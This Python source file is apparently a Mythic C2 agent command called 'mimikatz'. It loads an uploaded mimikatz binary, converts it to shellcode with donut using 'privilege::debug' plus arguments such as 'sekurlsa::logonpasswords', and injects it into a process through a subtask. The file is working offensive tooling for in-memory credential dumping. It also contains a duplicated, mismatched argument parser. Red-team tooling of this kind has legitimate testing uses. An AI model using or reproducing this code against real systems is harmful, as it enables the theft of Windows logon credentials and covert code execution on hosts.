from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from ..utils.packer import serialize_int, serialize_bool, serialize_string
import logging, sys
import os
import tempfile
import base64
# BOF utilities
from .utils.mythicrpc_utilities import *
from .utils.bof_utilities import *
import donut
from .inject_shellcode import *

logging.basicConfig(level=logging.INFO)


class MimikatzArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="mimi_arguments",
                cli_name="Arguments",
                display_name="Arguments",
                type=ParameterType.String,
                description="mimikatz.exe arguments. (e.g., sekurlsa::logonpasswords)",
                default_value="",
            ),
        ]
    
    async def get_files(self, callback: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        response = PTRPCDynamicQueryFunctionMessageResponse()
        file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
            CallbackID=callback.Callback,
            LimitByCallback=False,
            Filename="",
        ))
        if file_resp.Success:
            file_names = []
            for f in file_resp.Files:
                if f.Filename not in file_names and f.Filename.endswith(".exe"):
                    file_names.append(f.Filename)
            response.Success = True
            response.Choices = file_names
            return response
        else:
            await SendMythicRPCOperationEventLogCreate(MythicRPCOperationEventLogCreateMessage(
                CallbackId=callback.Callback,
                Message=f"Failed to get files: {file_resp.Error}",
                MessageLevel="warning"
            ))
            response.Error = f"Failed to get files: {file_resp.Error}"
            return response


    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply arguments")
        raise ValueError("Must supply named arguments or use the modal")

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception(
                "Require an assembly to execute.\n\tUsage: {}".format(
                    MimikatzArguments.help_cmd
                )
            )
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.split(" ", maxsplit=1)
            self.add_arg("assembly_name", parts[0])
            self.add_arg("assembly_arguments", "")
            if len(parts) == 2:
                self.add_arg("assembly_arguments", parts[1])

class MimikatCommand(CoffCommandBase):
    cmd = "mimikatz"
    needs_admin = False
    help_cmd = "mimikatz [args]"
    description = "Execute mimikatz on the host. (e.g., mimikatz sekurlsa::logonpasswords) OPSEC Warning: Uses donut shellcode."
    version = 1
    author = "@c0rnbread"
    script_only = True
    attackmapping = []
    argument_class = MimikatzArguments
    attributes = CommandAttributes(
        dependencies=["inject_shellcode"],
        alias=True
    )
    

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        
        '''
            Steps:
                1. Parse arguments
                    a. mimi arguments
                2. generate PIC for mimikatz
                3. See if using PROCESS INJECT KIT
                    a. Get file id for inject_spawn.x64.o
                4. Add arg for process injection method
                
                5. Send subtask
        '''
        try:

            ######################################
            #                                    #
            #   Send SubTask to inject_shellcode #
            #                                    #
            ######################################      

            file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                    TaskID=taskData.Task.ID,
                    Filename="mimikatz.x64.exe",
                    LimitByCallback=False,
                    MaxResults=1
                ))
            
            if file_resp.Success:
                if len(file_resp.Files) > 0:
                    # Get the file contents of mimikatz
                    mimikatz_contents = await SendMythicRPCFileGetContent(
                        MythicRPCFileGetContentMessage(AgentFileId=file_resp.Files[0].AgentFileId)
                    )
                elif len(file_resp.Files) == 0:
                    raise Exception("Failed to find the named file. Have you uploaded it before? Did it get deleted?")
            else:
                raise Exception("Error from Mythic trying to search files:\n" + str(file_resp.Error))

            # Need a physical path for donut.create()
            fd, temppath = tempfile.mkstemp(suffix='.exe')
            logging.info(f"Writing mimikatz Contents to temporary file \"{temppath}\"")
            with os.fdopen(fd, 'wb') as tmp:
                tmp.write(mimikatz_contents.Content)

            # Create shellcode (Bypass=None, ExitOption=exit process)
            mimi_args = taskData.args.get_arg('mimi_arguments')
            full_args = f"privilege::debug {mimi_args} exit"
            mimi_shellcode = donut.create(file=temppath, params=full_args, bypass=1, exit_opt=2)
            
            # # Prepend Named Pipe stub (to set stdout/stderr for process)
            # named_pipe_stub_path = 'xenon/agent_code/stub/stub.bin'
            # with open(named_pipe_stub_path, 'rb') as f:
            #     stub_bytes = f.read()
            # mimi_shellcode = stub_bytes + mimi_shellcode
            
            # Clean up temp file
            os.remove(temppath)
            
            logging.info(f"Converted Mimikatz into Shellcode {len(mimi_shellcode)} bytes")

            response.DisplayParams = "{}".format(mimi_args)
            
            shellcode_file_resp = await SendMythicRPCFileCreate(
                MythicRPCFileCreateMessage(
                    TaskID=taskData.Task.ID, 
                    FileContents=mimi_shellcode, 
                    DeleteAfterFetch=True)
            )
            
            if shellcode_file_resp.Success:
                shellcode_file_uuid = shellcode_file_resp.AgentFileId
            else:
                raise Exception("Failed to register execute_assembly binary: " + shellcode_file_resp.Error)
            
            # Debugging
            # logging.info(taskData.args.to_json())
            # Group name 'Existing'
            # Send subtask to inject shellcode
            subtask = await SendMythicRPCTaskCreateSubtask(
                MythicRPCTaskCreateSubtaskMessage(
                    taskData.Task.ID,
                    CommandName="inject_shellcode",
                    SubtaskCallbackFunction="coff_completion_callback",
                    Params=json.dumps({
                        "shellcode_file": shellcode_file_uuid,
                        "method": "kit"
                    }),
                    Token=taskData.Task.TokenID,
                )
            )
            
            
            return response


        except Exception as e:
            raise Exception("Error from Mythic: " + str(sys.exc_info()[-1].tb_lineno) + " : " + str(e))
        

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp